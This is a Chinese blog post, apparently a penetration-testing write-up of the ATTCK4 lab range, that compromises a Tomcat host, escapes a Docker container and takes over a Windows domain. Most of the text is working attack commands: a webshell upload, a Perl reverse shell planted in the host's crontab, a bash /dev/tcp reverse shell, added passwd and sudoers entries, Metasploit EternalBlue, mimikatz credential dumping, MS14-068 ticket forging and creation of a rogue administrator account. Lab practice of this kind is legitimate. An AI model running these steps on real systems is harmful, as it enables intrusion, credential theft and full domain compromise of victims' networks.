@@ -1,0 +1,431 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>ATTCK4 | admire@</title><meta name="author" content="admire@"><meta name="copyright" content="admire@"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="win7 douser &#x2F; Dotest123 web ubuntu&#x2F;ubuntu DC administrator:Test2008 1qaz!QAZ 启动docker 1sudo docker start ec 17 09 bb da 3d ab ad      信息收集1arp-scan -l        端口扫描 1nmap -sS -p- 192.168.6.195">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ATTCK4">
+<meta property="og:url" content="http://example.com/2024/03/20/ATTCK4/index.html">
+<meta property="og:site_name" content="admire@">
+<meta property="og:description" content="win7 douser &#x2F; Dotest123 web ubuntu&#x2F;ubuntu DC administrator:Test2008 1qaz!QAZ 启动docker 1sudo docker start ec 17 09 bb da 3d ab ad      信息收集1arp-scan -l        端口扫描 1nmap -sS -p- 192.168.6.195">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.webp">
+<meta property="article:published_time" content="2024-03-20T00:55:17.000Z">
+<meta property="article:modified_time" content="2024-03-20T00:57:10.991Z">
+<meta property="article:author" content="admire@">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/03/20/ATTCK4/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ATTCK4',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-20 08:57:10'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="admire@" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-shouyex"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-zuixinwenzhang_huaban"></i><span> 找文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-fenlei1"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-biaoqian1"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-shijianzhou"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-shenghuo"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw iconfont icon-liaotian-04"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/share/"><i class="fa-fw iconfont icon-fenxiang"></i><span> 分享</span></a></li><li><a class="site-page child" href="/daohang/"><i class="fa-fw iconfont icon-daohang"></i><span> 导航站</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-gerenzhongxin"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="admire@"><span class="site-name">admire@</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-shouyex"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-zuixinwenzhang_huaban"></i><span> 找文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-fenlei1"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-biaoqian1"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-shijianzhou"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-shenghuo"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw iconfont icon-liaotian-04"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/share/"><i class="fa-fw iconfont icon-fenxiang"></i><span> 分享</span></a></li><li><a class="site-page child" href="/daohang/"><i class="fa-fw iconfont icon-daohang"></i><span> 导航站</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-gerenzhongxin"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ATTCK4</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-20T00:55:17.000Z" title="发表于 2024-03-20 08:55:17">2024-03-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-20T00:57:10.991Z" title="更新于 2024-03-20 08:57:10">2024-03-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ATTCK4"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>win7</p>
+<p>douser &#x2F; Dotest123</p>
+<p>web</p>
+<p>ubuntu&#x2F;ubuntu</p>
+<p>DC</p>
+<p>administrator:Test2008</p>
+<p>1qaz!QAZ</p>
+<p>启动docker</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker start ec 17 09 bb da 3d ab ad</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2024/03/20/ATTCK4/image-20240313120840471.png" class="" title="image-20240313120840471">
+
+
+
+<p>端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- 192.168.6.195</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240313153253043.png" class="" title="image-20240313153253043">
+
+
+
+<h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><p><strong>Tomcat任意写入文件漏洞（CVE-2017-12615）</strong></p>
+<p>哥斯拉生成木马</p>
+<img src="/2024/03/20/ATTCK4/image-20240313161728991.png" class="" title="image-20240313161728991">
+
+
+
+<img src="/2024/03/20/ATTCK4/image-20240313161710462.png" class="" title="image-20240313161710462">
+
+<p>连接成功</p>
+<img src="/2024/03/20/ATTCK4/image-20240313161809260.png" class="" title="image-20240313161809260">
+
+
+
+<p>进入终端，发现为docker环境</p>
+<img src="/2024/03/20/ATTCK4/image-20240313162007877.png" class="" title="image-20240313162007877">
+
+
+
+<h1 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h1><p><strong>Docker Privileged特权逃逸</strong></p>
+<p>操作者使用特权模式启动的容器时，Docker管理员可以通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令</p>
+<p>在容器中时可以通过如下参数检测当前容器是否是以特权模式启动:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/status | grep <span class="title class_">CapEff</span></span><br></pre></td></tr></table></figure>
+
+<p>如果是以特权模式启动的话，CapEff对应的掩码值为0000003fffffffff</p>
+<img src="/2024/03/20/ATTCK4/image-20240313165345144.png" class="" title="image-20240313165345144">
+
+
+
+<p>方法一</p>
+<p>查看挂载磁盘设备</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
+
+<p>在容器内部执行以下命令，将宿主机文件挂载到 &#x2F;test 目录下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /test &amp;&amp; mount /dev/sda1 /test</span><br></pre></td></tr></table></figure>
+
+<p>设置定时任务</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $&#x27;*/<span class="number">1</span> * * * * perl -e \&#x27;use Socket;$i=<span class="string">&quot;192，168，6，142&quot;</span>;$p=<span class="number">2333</span>;socket(S<span class="punctuation">,</span>PF_INET<span class="punctuation">,</span>SOCK_STREAM<span class="punctuation">,</span>getprotobyname(<span class="string">&quot;tcp&quot;</span>));if(connect(S<span class="punctuation">,</span>sockaddr_in($p<span class="punctuation">,</span>inet_aton($i))))<span class="punctuation">&#123;</span>open(STDIN<span class="punctuation">,</span><span class="string">&quot;&gt;&amp;S&quot;</span>);open(STDOUT<span class="punctuation">,</span><span class="string">&quot;&gt;&amp;S&quot;</span>);open(STDERR<span class="punctuation">,</span><span class="string">&quot;&gt;&amp;S&quot;</span>);exec(<span class="string">&quot;/bin/sh -i&quot;</span>);<span class="punctuation">&#125;</span>;\&#x27;&#x27; &gt;&gt; /test/var/spool/cron/crontabs/root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>方法二</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /mnt</span><br><span class="line"><span class="built_in">chroot</span> /mnt adduser john</span><br></pre></td></tr></table></figure>
+
+<p>通过新添加的用户登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /mnt</span><br><span class="line">mount /dev/sda1 /mnt</span><br><span class="line">ls /mnt</span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">perl -le &#x27;print crypt(&quot;123456&quot;,&quot;addedsalt&quot;)&#x27;</span><br><span class="line">echo &quot;aaa:adrla7IBSfTZQ:1003:1003:ub:/root:/bin/bash&quot; &gt;&gt;/mnt/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>其实这个文件有很多条信息，我只单独列出这两条。很清晰的看到每条信息由7个字段组成，由:隔开。<br>字段包含如下信息：<br>1️⃣ 登录用户名<br>2️⃣ 用户密码（进行了别的处理，这里x简单表示，加密后存储在&#x2F;etc&#x2F;shadow文件中）<br>3️⃣ 用户账户的UID（数字形式）<br>4️⃣ 用户账户的组ID（GID）（数字形式）<br>5️⃣ 用户账户的文本描述（称为备注字段）<br>6️⃣ 用户HOME目录位置<br>7️⃣ 用户的默认shell</p>
+<img src="/2024/03/20/ATTCK4/image-20240313174530313.png" class="" title="image-20240313174530313">
+
+<p>ssh连接</p>
+<img src="/2024/03/20/ATTCK4/image-20240313174639091.png" class="" title="image-20240313174639091">
+
+<h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;aaa ALL=(ALL:ALL) ALL&quot; &gt;&gt; /mnt/etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240313203847644.png" class="" title="image-20240313203847644">
+
+<p>当用户执行sudo时，系统会主动寻找&#x2F;etc&#x2F;sudoers文件，判断该用户是否有执行sudo的权限<br>–&gt;确认用户具有可执行sudo的权限后，让用户输入用户自己的密码确认<br>–&gt;若密码输入成功，则开始执行sudo后续的命令</p>
+<p>1.root执行sudo时不需要输入密码(sudoers文件中有配置root ALL&#x3D;(ALL) ALL这样一条规则)<br>2.欲切换的身份与执行者的身份相同，不需要输入密码<br>3.&#x2F;etc&#x2F;sudoers文件设置为允许用户在不输入该用户的密码的情况下使用所有命令<br>如设置允许wheel用户组中的用户在不输入该用户的密码的情况下使用所有命令<br>wheel        ALL&#x3D;(ALL)       NOPASSWD: ALL</p>
+<p>提权成功</p>
+<img src="/2024/03/20/ATTCK4/image-20240313203911492.png" class="" title="image-20240313203911492">
+
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.6.142/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set payload cmd/unix/reverse_bash</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240313204416561.png" class="" title="image-20240313204416561">
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 回到后台</span><br><span class="line">background</span><br><span class="line"># 升级会话</span><br><span class="line">sessions -u 1</span><br><span class="line"># 进入meterpreter会话</span><br><span class="line">sessions 2</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240313204708141.png" class="" title="image-20240313204708141">
+
+
+
+<h1 id="域主机渗透"><a href="#域主机渗透" class="headerlink" title="域主机渗透"></a><strong>域主机渗透</strong></h1><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>添加路由</p>
+<p>第一种方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add 192.168.183.0 255.255.255.0 2</span><br></pre></td></tr></table></figure>
+
+<p>第二种方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240313211411158.png" class="" title="image-20240313211411158">
+
+
+
+
+
+<p>内网进行主机发现和端口扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp </span><br><span class="line">set session 2</span><br><span class="line">set rhosts 192.168.183.0/24</span><br><span class="line">set ports 139,445,3389</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2024/03/20/ATTCK4/image-20240314082221603.png" class="" title="image-20240314082221603">
+
+
+
+<p>内网主机均开启了 139，445端口</p>
+<p>192.168.183.129(win7)</p>
+<p>192.168.183.130(DC)</p>
+<h2 id="永恒之蓝攻击"><a href="#永恒之蓝攻击" class="headerlink" title="永恒之蓝攻击"></a>永恒之蓝攻击</h2><p>1、端口445：SMB协议的主要通信端口。在现代版本的Windows操作系统中，SMB协议的通信主要通过TCP&#x2F;IP协议在端口445上进行。端口445上的SMB通信提供了更高的安全性和功能，包括对加密和身份验证的支持。</p>
+<p>2、端口139：早期版本的SMB协议通常在端口139上进行通信。它是NetBIOS Session Service的默认端口，用于在Windows网络上建立会话和进行文件共享。但是，端口139上的SMB通信缺乏加密和身份验证的支持，存在安全风险。因此，在现代网络环境中，推荐使用端口445进行SMB通信。</p>
+<p><strong>建立代理</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.toml </span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240314113731400.png" class="" title="image-20240314113731400">
+
+<p>ubuntu</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.toml</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.6.142</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[proxies]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 7777</span><br><span class="line">plugin = socks5</span><br><span class="line">local_ip = 192.168.183.128</span><br><span class="line">local_port= 7777</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">setg proxies socks5:192.168.6.142:7777</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.183.129</span><br><span class="line">set lhost 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<img src="/2024/03/20/ATTCK4/image-20240313214838880.png" class="" title="image-20240313214838880">
+
+
+
+<p>获得明文密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">该命令可以列举系统中的明文密码:</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2024/03/20/ATTCK4/image-20240314144601087.png" class="" title="image-20240314144601087">
+
+
+
+<h1 id="域用户提权"><a href="#域用户提权" class="headerlink" title="域用户提权"></a>域用户提权</h1><p><strong>快速检测目标系统未打漏洞补丁</strong></p>
+<p><strong>内核漏洞提权</strong> </p>
+<table>
+<thead>
+<tr>
+<th align="left">漏洞代号</th>
+<th align="left">补丁编号</th>
+<th align="left">适用平台</th>
+<th align="left">用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">MS14-058</td>
+<td align="left">KB3000061</td>
+<td align="left">03，08，12，Win7</td>
+<td align="left">本地提权</td>
+</tr>
+<tr>
+<td align="left">MS14-068</td>
+<td align="left">KB3011780</td>
+<td align="left">域控未安装补丁的域内，03，08，12</td>
+<td align="left">域内提权</td>
+</tr>
+<tr>
+<td align="left">MS15-051</td>
+<td align="left">KB3057191</td>
+<td align="left">03，08，12，Win7</td>
+<td align="left">本地提权</td>
+</tr>
+<tr>
+<td align="left">MS16-032</td>
+<td align="left">KB3143141</td>
+<td align="left">08 r2以后，12，Win7</td>
+<td align="left">本地提权</td>
+</tr>
+<tr>
+<td align="left">MS17-010</td>
+<td align="left">KB4013389</td>
+<td align="left">03，08，12，16，win7</td>
+<td align="left">远程注入dll</td>
+</tr>
+<tr>
+<td align="left">CVE-2020-0787</td>
+<td align="left"></td>
+<td align="left">all</td>
+<td align="left">windows全版本提权</td>
+</tr>
+<tr>
+<td align="left">CVE-2020-1472</td>
+<td align="left"></td>
+<td align="left">domain</td>
+<td align="left">域内提权</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo &gt; temp.txt&amp;(for %i in (KB3000061 KB3011780 KB3057191 KB3143141 KB4013389) do @type temp.txt|@find /i  &quot;%i&quot;|| @echo %i Not Installed!)&amp;del /f /q /a temp.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240314144837576.png" class="" title="image-20240314144837576">
+
+<p>获得账号密码 sid 域控名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kiwi_cmd sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240314163308073.png" class="" title="image-20240314163308073">
+
+<p>利用Kerberos 域用户提权漏洞（MS14-068;CVE-2014-6324)来获得域控。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u douser@DEMO.COM -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240314160900297.png" class="" title="image-20240314160900297">
+
+
+
+
+<p><code>mimikatz # kerberos::ptc TGT_douser@demo.com.ccache</code> 导入票据</p>
+<img src="/2024/03/20/ATTCK4/image-20240314163005819.png" class="" title="image-20240314163005819">
+
+
+
+
+
+<p>成功连接到2008域控，并查看域控c盘</p>
+<p>dir \WIN-ENS2VR5TR3N\C$</p>
+<img src="/2024/03/20/ATTCK4/image-20240314163114678.png" class="" title="image-20240314163114678">
+
+<p><strong>使用PsExec工具获取shell &#x2F;&#x2F;PsExec64.exe以管理员权限运行连接域控远程桌面连接</strong></p>
+<p>msf用ms17-010可以直接打通DC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp *#开启远程桌面服务*</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/20/ATTCK4/image-20240314163638043.png" class="" title="image-20240314163638043">
+
+<p>添加用户 远程桌面连接即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user cyy 1qazQAZ /add</span><br><span class="line">net localgroup administrators cyy /add</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 192.168.183.130:3389  </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">admire@</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/03/20/ATTCK4/">http://example.com/2024/03/20/ATTCK4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">admire@</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/03/12/ATTCK1/" title="ATTCK1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div 